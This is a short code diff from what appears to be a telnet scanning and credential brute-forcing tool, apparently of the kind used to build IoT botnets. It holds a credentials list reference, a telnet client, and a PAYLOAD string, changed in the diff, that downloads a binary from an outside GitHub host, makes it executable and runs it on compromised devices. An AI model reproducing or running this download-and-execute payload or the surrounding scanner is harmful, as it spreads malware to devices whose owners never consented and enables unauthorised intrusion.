@@ -37,7 +37,7 @@ CREDENTIALS = [
 
 TELNET_TIMEOUT = 0.05
 MAX_WORKERS = 50
-PAYLOAD = "wget https://github.com/Jaxploit/payload/raw/refs/heads/main/payload.bin && chmod 777 * && ./payload.bin"
+PAYLOAD = "wget https://github.com/Jaxploit/payload/raw/refs/heads/main/payloadVC2 && chmod 777 payloadVC2 && ./payloadVC2"
 SCAN_DURATION = 1800
 
 class TelnetClient:
